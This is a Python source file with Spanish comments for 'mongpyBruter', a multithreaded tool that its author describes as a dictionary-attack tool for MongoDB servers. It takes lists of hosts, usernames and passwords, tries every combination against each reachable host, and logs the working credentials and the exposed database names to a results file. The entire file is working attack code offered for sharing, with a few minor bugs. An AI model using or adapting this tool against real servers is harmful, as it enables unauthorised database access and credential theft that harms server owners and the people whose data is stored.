# -*- coding: utf-8 -*-

'''mongpyBruter es una sencilla herramienta para realizar ataques de diccionario en servidores Mongo
__author__="L0stByt3"
__email__="hacknautilus@protonmail.com"

Este programa es de libre distribucion, te invito a compartirlo y mejorarlo
'''

import pymongo
import argparse
import pathlib
import time
import sys
import queue
import threading
from tqdm import tqdm



totalHosts=0
totalHostsErrors=0

class MongpyBruter(threading.Thread):

    def __init__(
        self,

        jobs: queue.Queue,
    ):

        threading.Thread.__init__(self)
        self.jobs = jobs
        self.foundHosts=0
        self.maxSevSelDelay=1000


    def run(self):

        self.running = True

        while self.running:
            try:

                host, username, password = self.jobs.get(False)

            except queue.Empty:
                time.sleep(0.1)
                continue

            mongoUriString="mongodb://"+host+"/"

            try:

                client=pymongo.MongoClient(mongoUriString,serverSelectionTimeoutMS=self.maxSevSelDelay,username=username,password=password)

                time.sleep(0.6)
               
                databases=client.list_database_names()

                if databases:
                    self.foundHosts=self.foundHosts+1
                    
                    print("Host: "+host+" ( usuario: "+username+" y contrasenia: "+password+ ") DB:"+ str(databases))
              
                    with open("mongo_user_pass_result.txt", "a") as myfile:
                        myfile.write( "Host: "+ host + " ( usuario: " +username+" y contrasenia: "+password+ ") DB:"+ str(databases))
                    self.jobs.task_done()
                           
              

 

            except (pymongo.errors.ConnectionFailure) as e:
               pass
            
            except pymongo.errors.OperationFailure as e:
                 msg = e.details.get('errmsg', '')
                 if e.code == 18 or 'auth fails' in msg:
                    pass
                 else:
                    pass
  
            except Exception as e:
                pass
            


        return super().run()

    def resumen():
        print("----------Resumen----------")
        print('Hosts encontados:{}'.format(str(foundHosts)))


    def stop(self):
        self.running = False
        self.join()



def argumentos() -> argparse.Namespace:
    """
    pasar argumentos de la linea de comandos

    """
    parser = argparse.ArgumentParser(
        prog="mongpyBruter",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        add_help=False
    )

    parser.add_argument('-hh',"--help", action="help", help="Muestra este mensaje de ayuda")
    parser.add_argument('-t',"--threads", help="numero de hilos a utilizar", default=1, type=int)
    parser.add_argument('-h',"--hosts", help="ruta del archivo que contiene lista de las ip o dominios", type=pathlib.Path)
    parser.add_argument('-u',"--users", help="ruta del archivo que contiene lista de usuarios", type=pathlib.Path)
    parser.add_argument('-p',"--passwords", help="ruta de archivo que contiene la lista de password", type=pathlib.Path)
    

    return parser.parse_args()



def results():
    print( MongpyBruter.foundHosts )

def checkHost(host)->bool:
    '''Verificar la disponibilidad del host'''
    try:
      mongoUriString="mongodb://"+host+"/"
      client=pymongo.MongoClient(mongoUriString,serverSelectionTimeoutMS=1000,username="admin",password="admin")

      time.sleep(0.8)

      databases=client.list_database_names()
     
      return True
    except (pymongo.errors.ConnectionFailure):
        return False
    except pymongo.errors.OperationFailure as e:
         msg = e.details.get('errmsg', '')
         if e.code == 18 or 'auth fails' in msg:
            # Auth failed.
            return True
    except pymongo.errors.ConfigurationError as e:
            return False

def main():

        args=argumentos()

        try:
            assert args.threads >= 1, "numero de hilos debe ser >= 1"
            assert args.hosts.is_file(), "el archivo de hosts no exite"
            assert args.users.is_file(), "el archivo de nombre de usuarios no exite"
            assert args.passwords.is_file(), "el archivo de contrasena no existe"

        except AssertionError:
            sys.exit(1)


        thread_pool = []
        jobs = queue.Queue()

        '''
        total_hosts = sum( 1 for line in open( args.hosts ) )
        total_users = sum( 1 for line in open( args.users ) )
        total_passwords = sum( 1 for line in open( args.passwords ) )

        banner( total_hosts, total_users, total_passwords )
        '''




        with args.hosts.open("r") as h:
            hosts = h.readlines()
            for host in tqdm(hosts, leave=True):
                if checkHost(host.strip()):
                    
                    for thread_id in range(args.threads):
                        thread = MongpyBruter(jobs)
                        thread.name = str(thread_id)
                        thread.start()
                        thread_pool.append(thread)

                    with args.users.open("r") as u:
             
                            with args.users.open("r") as u:
                                users = u.readlines()
                                with args.passwords.open("r") as p:
                                    passwords = p.readlines()
                                    for usuario in users:
                            
                                        for password in passwords:    
                                         
                                            jobs.put(
                                                (
                                                    host.strip(),
                                                    usuario.strip(),
                                                    password.strip(),
                                                
                                                )
                                            )                
                                    
  
                try:
                    while not jobs.empty():
                        #for thread in thread_pool:
                            #if not thread.is_alive():
                                #print(f"Thread {thread.name} exited early with errors"+ str(host))


                        for thread in thread_pool:
                            if thread.is_alive():
                                break
                        else:
                            break

                except (SystemExit, KeyboardInterrupt):
                    print(f"Se interrumpio el proceso")
                    sys.exit(1)

                finally:
                    for thread in thread_pool:
                        thread.stop()

                    for thread in thread_pool:
                        thread.join()
        
if __name__ == "__main__":
    main()
